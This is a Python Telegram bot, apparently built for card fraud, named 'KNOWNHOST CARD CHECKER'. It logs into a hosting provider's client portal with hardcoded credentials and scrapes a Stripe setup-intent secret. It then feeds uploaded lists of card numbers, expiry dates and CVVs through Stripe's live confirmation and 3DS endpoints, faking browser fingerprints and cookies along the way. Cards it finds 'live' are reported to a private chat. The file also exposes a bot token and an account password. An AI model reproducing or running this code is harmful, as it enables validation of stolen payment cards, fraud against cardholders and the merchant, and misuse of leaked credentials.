import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
import requests
from bs4 import BeautifulSoup
import json
import random
import string
import time
import re
from concurrent.futures import ThreadPoolExecutor
import threading

# ========== الإعدادات ==========
BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
ADMIN_IDS = [5895491379, 844663875]

# بيانات تسجيل الدخول
USERNAME = "desertessence@desertessence.com"
PASSWORD = "desertessence@desertessence.com"
LOGIN_URL = "https://my.knownhost.com/client/login"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
}

# ========== إحصائيات مع Lock ==========
stats_lock = threading.Lock()
stats = {
    'total': 0,
    'checking': 0,
    'approved': 0,
    'rejected': 0,
    'secure_3d': 0,
    'auth_attempted': 0,
    'errors': 0,
    'start_time': None,
    'is_running': False,
    'should_stop': False,
    'dashboard_message_id': None,
    'chat_id': None,
    'current_card': '',
    'error_details': {},
    'last_response': 'Waiting...',
    'cards_checked': 0,
    'sent_results': 0,  # عداد النتائج المرسلة فعلياً
}

# كوكيز الجلسة الحالية (يتم تحديثها ديناميكياً)
session_cookies = {}
cookies_lock = threading.Lock()

# ========== دالات تحديث الكوكيز ==========
def generate_random_string(length):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def generate_guid():
    return f"{generate_random_string(8)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(4)}-{generate_random_string(12)}"

def get_csrf_and_cookies(session):
    """استخراج CSRF Token"""
    try:
        r = session.get(LOGIN_URL, headers=HEADERS, timeout=15)
        r.raise_for_status()
        soup = BeautifulSoup(r.text, "html.parser")
        token_input = soup.find("input", {"name": "_csrf_token"})
        csrf_token = token_input["value"] if token_input and token_input.has_attr("value") else None
        return csrf_token
    except Exception as e:
        print(f"[!] خطأ في استخراج CSRF: {e}")
        return None

def login_and_get_fresh_cookies():
    """تسجيل الدخول وجلب كوكيز جديدة تماماً"""
    try:
        with requests.Session() as s:
            # إضافة كوكيز أساسية عشوائية
            s.cookies.set('_gcl_au', f'1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}')
            s.cookies.set('_fbp', f'fb.1.{int(time.time() * 1000)}.{random.randint(100000000000000000, 999999999999999999)}')
            s.cookies.set('_gid', f'GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}')
            s.cookies.set('_ga', f'GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}')
            
            csrf_token = get_csrf_and_cookies(s)
            if not csrf_token:
                print("[!] فشل في الحصول على CSRF Token")
                return None
            
            print(f"[✓] تم استخراج CSRF Token جديد")
            
            data = {
                "_csrf_token": csrf_token,
                "username": USERNAME,
                "password": PASSWORD,
                "remember_me": "true",
            }
            
            post_headers = HEADERS.copy()
            post_headers.update({
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://my.knownhost.com",
                "Referer": LOGIN_URL,
            })
            
            r = s.post(LOGIN_URL, headers=post_headers, data=data, allow_redirects=True, timeout=15)
            
            all_cookies = s.cookies.get_dict()
            important = {k: v for k, v in all_cookies.items() if k in ("blesta_sid", "blesta_csid")}
            
            if important:
                print(f"[✓] تم الحصول على كوكيز جديدة: {list(important.keys())}")
                return all_cookies
            else:
                print("[!] لم يتم العثور على الكوكيز المهمة")
                return None
    except Exception as e:
        print(f"[!] خطأ في تسجيل الدخول: {e}")
        return None

def get_session_cookies():
    """الحصول على الكوكيز الحالية أو تجديدها"""
    global session_cookies
    
    with cookies_lock:
        # إذا لم تكن هناك كوكيز أو مر أكثر من 20 بطاقة، جدد الكوكيز
        if not session_cookies or stats['cards_checked'] % 20 == 0:
            print("[🔄] تجديد الكوكيز...")
            fresh = login_and_get_fresh_cookies()
            if fresh:
                session_cookies = fresh
                print("[✅] تم تحديث الكوكيز بنجاح")
            else:
                print("[⚠️] فشل تحديث الكوكيز، سيتم استخدام كوكيز أساسية")
                session_cookies = {
                    '_gcl_au': f'1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}',
                    '_fbp': f'fb.1.{int(time.time() * 1000)}.{random.randint(100000000000000000, 999999999999999999)}',
                    '_gid': f'GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}',
                    '_ga': f'GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}',
                }
        
        return session_cookies.copy()

def create_fresh_session():
    """إنشاء جلسة جديدة مع كوكيز محدثة"""
    session = requests.Session()
    
    # الحصول على الكوكيز الحالية
    cookies = get_session_cookies()
    session.cookies.update(cookies)
    
    # إضافة كوكيز Stripe عشوائية
    muid = f"{generate_guid()}{generate_random_string(6)}"
    sid = f"{generate_guid()}{generate_random_string(6)}"
    guid = f"{generate_guid()}{generate_random_string(6)}"
    stripe_js_id = generate_guid()
    
    session.cookies.set('__stripe_mid', muid)
    session.cookies.set('__stripe_sid', sid)
    
    return session, muid, sid, guid, stripe_js_id

def get_payment_page(session):
    """الحصول على صفحة الدفع واستخراج التوكن"""
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }
    
    try:
        response = session.get('https://my.knownhost.com/client/accounts/add/cc/', headers=headers, timeout=20)
        
        csrf_token = None
        csrf_match = re.search(r'_csrf_token"\s+value="([^"]+)"', response.text)
        if csrf_match:
            csrf_token = csrf_match.group(1)
        
        setup_secret = None
        setup_match = re.search(r"'(seti_[A-Za-z0-9]+_secret_[A-Za-z0-9]+)'", response.text)
        if setup_match:
            setup_secret = setup_match.group(1)
        
        return csrf_token, setup_secret
    except Exception as e:
        print(f"[!] خطأ في get_payment_page: {e}")
        return None, None

# ========== فحص البطاقة ==========
async def check_card(card, bot_app):
    """فحص بطاقة واحدة مع معالجة محسنة"""
    parts = card.strip().split('|')
    if len(parts) != 4:
        with stats_lock:
            stats['errors'] += 1
            stats['error_details']['FORMAT_ERROR'] = stats['error_details'].get('FORMAT_ERROR', 0) + 1
        await send_result(bot_app, card, "ERROR", "صيغة خاطئة")
        return card, "ERROR", "صيغة خاطئة"
    
    card_number, exp_month, exp_year, cvv = parts
    
    # محاولة أولى
    session, muid, sid, guid, stripe_js_id = create_fresh_session()
    csrf_token, setup_secret = get_payment_page(session)
    
    # إذا فشل Setup Secret، حاول مرة أخرى بكوكيز جديدة
    retry_count = 0
    while not setup_secret and retry_count < 2:
        print(f"[!] محاولة {retry_count + 1}: فشل Setup Secret، تجديد الكوكيز...")
        session.close()
        
        # إجبار تجديد الكوكيز
        global session_cookies
        with cookies_lock:
            session_cookies = {}
        
        session, muid, sid, guid, stripe_js_id = create_fresh_session()
        csrf_token, setup_secret = get_payment_page(session)
        retry_count += 1
    
    if not setup_secret:
        with stats_lock:
            stats['errors'] += 1
            stats['error_details']['SETUP_ERROR'] = stats['error_details'].get('SETUP_ERROR', 0) + 1
        session.close()
        await send_result(bot_app, card, "ERROR", "فشل Setup")
        return card, "ERROR", "فشل Setup"
    
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }
    
    data = {
        'stripe_js_id': stripe_js_id,
        'referrer_host': 'my.knownhost.com',
        'key': 'pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn',
        'request_surface': 'web_card_element_popup',
    }
    
    try:
        session.post('https://merchant-ui-api.stripe.com/elements/wallet-config', headers=headers, data=data, timeout=20)
    except:
        pass
    
    time_on_page = random.randint(300000, 600000)
    
    confirm_data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=+&payment_method_data[billing_details][address][city]=&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]=&payment_method_data[billing_details][address][line2]=&payment_method_data[billing_details][address][postal_code]=&payment_method_data[billing_details][address][state]=AL&payment_method_data[card][number]={card_number}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={exp_month}&payment_method_data[card][exp_year]={exp_year}&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F0366a8cf46%3B+stripe-js-v3%2F0366a8cf46%3B+card-element&payment_method_data[referrer]=https%3A%2F%2Fmy.knownhost.com&payment_method_data[time_on_page]={time_on_page}&payment_method_data[client_attribution_metadata][client_session_id]={stripe_js_id}&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn&client_attribution_metadata[client_session_id]={stripe_js_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_secret={setup_secret}'
    
    setup_intent_id = setup_secret.split('_secret_')[0]
    
    try:
        response = session.post(
            f'https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm',
            headers=headers,
            data=confirm_data,
            timeout=20
        )
        
        result = response.json()
        
        if 'next_action' in result:
            source = result['next_action']['use_stripe_sdk']['three_d_secure_2_source']
            
            auth_data = f'source={source}&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22786%22%2C%22browserScreenWidth%22%3A%221397%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F141.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_51JriIXI1CNyBUB8COjjDgdFObvaacy3If70sDD8ZSj0UOYDObpyQ4LaCGqZVzQiUqePAYMmUs6pf7BpAW8ZTeAJb00YcjZyWPn'
            
            auth_response = session.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=auth_data, timeout=20)
            auth_result = auth_response.json()
            
            trans_status = auth_result.get('ares', {}).get('transStatus', 'Unknown')
            
            session.close()
            
            # معالجة النتائج وإرسالها لحظياً
            if trans_status == 'N':
                with stats_lock:
                    stats['approved'] += 1
                await send_result(bot_app, card, "APPROVED", "Approved ✅")
                return card, "APPROVED", "Approved"
            
            elif trans_status == 'R':
                with stats_lock:
                    stats['rejected'] += 1
                await send_result(bot_app, card, "REJECTED", "Declined")
                return card, "REJECTED", "Declined"
            
            elif trans_status == 'C':
                with stats_lock:
                    stats['secure_3d'] += 1
                await send_result(bot_app, card, "3D_SECURE", "3D Secure Challenge")
                return card, "3D_SECURE", "3DS"
            
            elif trans_status == 'A':
                with stats_lock:
                    stats['auth_attempted'] += 1
                await send_result(bot_app, card, "AUTH_ATTEMPTED", "Authentication Attempted")
                return card, "AUTH_ATTEMPTED", "Auth Attempted"
            
            else:
                with stats_lock:
                    stats['errors'] += 1
                    stats['error_details']['UNKNOWN_STATUS'] = stats['error_details'].get('UNKNOWN_STATUS', 0) + 1
                await send_result(bot_app, card, "UNKNOWN", trans_status)
                return card, "UNKNOWN", trans_status
        
        else:
            with stats_lock:
                stats['errors'] += 1
                stats['error_details']['NO_3DS'] = stats['error_details'].get('NO_3DS', 0) + 1
            session.close()
            await send_result(bot_app, card, "ERROR", "No 3DS")
            return card, "ERROR", "No 3DS"
            
    except Exception as e:
        with stats_lock:
            stats['errors'] += 1
            stats['error_details']['EXCEPTION'] = stats['error_details'].get('EXCEPTION', 0) + 1
        session.close()
        await send_result(bot_app, card, "EXCEPTION", str(e))
        return card, "EXCEPTION", str(e)

# ========== دالات البوت ==========
async def send_result(bot_app, card, status_type, message):
    """إرسال نتيجة الفحص لحظياً مع عداد دقيق"""
    if not stats['chat_id']:
        return
    
    try:
        with stats_lock:
            card_number = stats['cards_checked']
        
        # إرسال كل النتائج (حتى Rejected و Errors)
        if status_type == 'APPROVED':
            with stats_lock:
                stats['sent_results'] += 1
            text = f"╔═══════════════╗\n✅ APPROVED CARD LIVE ✅\n╚═══════════════╝\n💳 {card}\n🔥 Status: Approved\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n╚═══════════════╝"
        
        elif status_type == 'AUTH_ATTEMPTED':
            with stats_lock:
                stats['sent_results'] += 1
            text = f"╔═══════════════╗\n🔄 AUTH ATTEMPTED CARD 🔄\n╚═══════════════╝\n💳 {card}\n🔥 Status: Auth Attempted\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n╚═══════════════╝"
        
        elif status_type == '3D_SECURE':
            with stats_lock:
                stats['sent_results'] += 1
            text = f"╔═══════════════╗\n⚠️ 3D SECURE CARD ⚠️\n╚═══════════════╝\n💳 {card}\n🔥 Status: 3D Secure\n📊 Card #{card_number}\n⚡️ Mahmoud Saad\n╚═══════════════╝"
        
        elif status_type == 'REJECTED':
            text = f"❌ **REJECTED**\n💳 `{card}`\n🔥 Status: Declined\n📊 Card #{card_number}"
        
        elif status_type == 'ERROR':
            text = f"⚠️ **ERROR**\n💳 `{card}`\n🔥 Reason: {message}\n📊 Card #{card_number}"
        
        elif status_type == 'UNKNOWN':
            text = f"❓ **UNKNOWN STATUS**\n💳 `{card}`\n🔥 Status: {message}\n📊 Card #{card_number}"
        
        elif status_type == 'EXCEPTION':
            text = f"💥 **EXCEPTION**\n💳 `{card}`\n🔥 Error: {message[:50]}\n📊 Card #{card_number}"
        
        else:
            return
        
        await bot_app.bot.send_message(
            chat_id=stats['chat_id'], 
            text=text,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"[!] خطأ في إرسال النتيجة: {e}")

def create_dashboard_keyboard():
    """إنشاء لوحة التحكم"""
    elapsed = 0
    if stats['start_time']:
        elapsed = int((datetime.now() - stats['start_time']).total_seconds())
    mins, secs = divmod(elapsed, 60)
    hours, mins = divmod(mins, 60)
    
    # حساب البطاقات الجارية
    with stats_lock:
        checking_now = stats['checking']
        total_processed = stats['approved'] + stats['rejected'] + stats['secure_3d'] + stats['auth_attempted'] + stats['errors']
    
    keyboard = [
        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
        [
            InlineKeyboardButton(f"🔄 يتم الفحص: {checking_now}", callback_data="checking"),
            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
        ],
        [
            InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="approved"),
            InlineKeyboardButton(f"❌ Rejected: {stats['rejected']}", callback_data="rejected")
        ],
        [
            InlineKeyboardButton(f"⚠️ 3D Secure: {stats['secure_3d']}", callback_data="3ds"),
            InlineKeyboardButton(f"🔄 Auth: {stats['auth_attempted']}", callback_data="auth")
        ],
        [
            InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors"),
            InlineKeyboardButton(f"📊 معالجة: {total_processed}/{stats['total']}", callback_data="processed")
        ],
        [
            InlineKeyboardButton(f"📬 نتائج مرسلة: {stats['sent_results']}", callback_data="sent")
        ]
    ]
    
    if stats['is_running']:
        keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
    
    if stats['current_card']:
        keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
    
    return InlineKeyboardMarkup(keyboard)

async def update_dashboard(bot_app):
    """تحديث الداشبورد"""
    if stats['dashboard_message_id'] and stats['chat_id']:
        try:
            await bot_app.bot.edit_message_text(
                chat_id=stats['chat_id'],
                message_id=stats['dashboard_message_id'],
                text="📊 **KNOWNHOST CARD CHECKER** 📊",
                reply_markup=create_dashboard_keyboard(),
                parse_mode='Markdown'
            )
        except Exception as e:
            if "message is not modified" not in str(e).lower():
                print(f"[!] خطأ في تحديث الداشبورد: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """أمر البداية"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return
    
    keyboard = [[InlineKeyboardButton("📄 إرسال ملف البطاقات", callback_data="send_file")]]
    await update.message.reply_text(
        "📊 **KNOWNHOST CARD CHECKER BOT**\n\n"
        "أرسل ملف .txt يحتوي على البطاقات\n"
        "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
        "✨ **مميزات محدثة:**\n"
        "• فحص متعدد البطاقات بسرعة\n"
        "• تحديث كوكيز تلقائي كل 20 بطاقة\n"
        "• داشبورد دقيق 100%\n"
        "• زر إيقاف فعّال",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """التعامل مع أي رسالة نصية"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة الملف المرسل"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
        return
    
    if stats['is_running']:
        await update.message.reply_text("⚠️ يوجد فحص جاري!")
        return
    
    file = await update.message.document.get_file()
    file_content = await file.download_as_bytearray()
    cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
    
    # إعادة تعيين الإحصائيات
    with stats_lock:
        stats['total'] = len(cards)
        stats['checking'] = 0
        stats['approved'] = 0
        stats['rejected'] = 0
        stats['secure_3d'] = 0
        stats['auth_attempted'] = 0
        stats['errors'] = 0
        stats['current_card'] = ''
        stats['error_details'] = {}
        stats['cards_checked'] = 0
        stats['sent_results'] = 0
        stats['start_time'] = datetime.now()
        stats['is_running'] = True
        stats['should_stop'] = False
        stats['chat_id'] = update.effective_chat.id
    
    # إعادة تعيين الكوكيز
    global session_cookies
    with cookies_lock:
        session_cookies = {}
    
    dashboard_msg = await update.message.reply_text(
        "📊 **KNOWNHOST CARD CHECKER** 📊",
        reply_markup=create_dashboard_keyboard(),
        parse_mode='Markdown'
    )
    stats['dashboard_message_id'] = dashboard_msg.message_id
    
    # بدء الفحص
    asyncio.create_task(process_cards(cards, context.application))

async def process_cards(cards, bot_app):
    """معالجة البطاقات بشكل متسلسل مع تحديث مستمر"""
    
    # تحديث الداشبورد كل ثانيتين
    async def dashboard_updater():
        while stats['is_running']:
            await update_dashboard(bot_app)
            await asyncio.sleep(2)
    
    updater_task = asyncio.create_task(dashboard_updater())
    
    try:
        for i, card in enumerate(cards):
            # فحص إذا تم طلب الإيقاف
            if stats['should_stop']:
                print("[🛑] تم إيقاف الفحص من المستخدم")
                break
            
            with stats_lock:
                stats['checking'] = 1
                parts = card.split('|')
                stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
            
            # فحص البطاقة
            await check_card(card, bot_app)
            
            with stats_lock:
                stats['cards_checked'] += 1
                stats['checking'] = 0
            
            # انتظار قصير بين البطاقات
            await asyncio.sleep(0.5)
    
    finally:
        # إيقاف التحديث التلقائي
        with stats_lock:
            stats['is_running'] = False
            stats['checking'] = 0
            stats['current_card'] = ''
        
        updater_task.cancel()
        await update_dashboard(bot_app)
        
        # إرسال ملخص نهائي
        if stats['chat_id']:
            keyboard = [
                [InlineKeyboardButton(f"✅ Approved: {stats['approved']}", callback_data="final_approved")],
                [InlineKeyboardButton(f"❌ Rejected: {stats['rejected']}", callback_data="final_rejected")],
                [InlineKeyboardButton(f"⚠️ 3D Secure: {stats['secure_3d']}", callback_data="final_3ds")],
                [InlineKeyboardButton(f"🔄 Auth Attempted: {stats['auth_attempted']}", callback_data="final_auth")],
                [InlineKeyboardButton(f"📬 نتائج مرسلة: {stats['sent_results']}", callback_data="final_sent")],
                [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="final_total")]
            ]
            
            total_processed = stats['approved'] + stats['rejected'] + stats['secure_3d'] + stats['auth_attempted'] + stats['errors']
            elapsed = int((datetime.now() - stats['start_time']).total_seconds())
            mins, secs = divmod(elapsed, 60)
            
            summary_text = (
                "✅ **اكتمل الفحص!**\n\n"
                f"📊 **الإحصائيات النهائية:**\n"
                f"• الإجمالي: {stats['total']}\n"
                f"• المعالجة: {total_processed}\n"
                f"• Approved: {stats['approved']} ✅\n"
                f"• 3D Secure: {stats['secure_3d']} ⚠️\n"
                f"• Auth Attempted: {stats['auth_attempted']} 🔄\n"
                f"• Rejected: {stats['rejected']} ❌\n"
                f"• Errors: {stats['errors']} ⚠️\n"
                f"• نتائج مرسلة: {stats['sent_results']} 📬\n\n"
                f"⏱ الوقت: {mins}:{secs:02d}"
            )
            
            await bot_app.bot.send_message(
                chat_id=stats['chat_id'],
                text=summary_text,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """معالجة ضغطات الأزرار"""
    query = update.callback_query
    
    # فحص الصلاحيات
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ غير مصرح", show_alert=True)
        return
    
    await query.answer()
    
    if query.data == "stop_check":
        with stats_lock:
            stats['should_stop'] = True
            stats['is_running'] = False
        await query.answer("🛑 جاري إيقاف الفحص...", show_alert=True)
        await update_dashboard(context.application)

def main():
    """بدء البوت"""
    print("🔄 جاري بدء البوت...")
    
    # تجهيز الكوكيز الأولية
    print("🔐 جاري تسجيل الدخول والحصول على الكوكيز...")
    initial_cookies = login_and_get_fresh_cookies()
    if initial_cookies:
        global session_cookies
        with cookies_lock:
            session_cookies = initial_cookies
        print("✅ تم الحصول على الكوكيز بنجاح")
    else:
        print("⚠️ فشل الحصول على الكوكيز الأولية، سيتم المحاولة عند الفحص")
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    
    print("🤖 البوت يعمل الآن...")
    print("✨ التحديثات:")
    print("  • تحديث كوكيز تلقائي كل 20 بطاقة")
    print("  • داشبورد محدث كل ثانيتين")
    print("  • عداد نتائج دقيق 100%")
    print("  • زر إيقاف فعّال")
    print("  • بدون ملفات خارجية")
    
    app.run_polling()

if __name__ == "__main__":
    main()
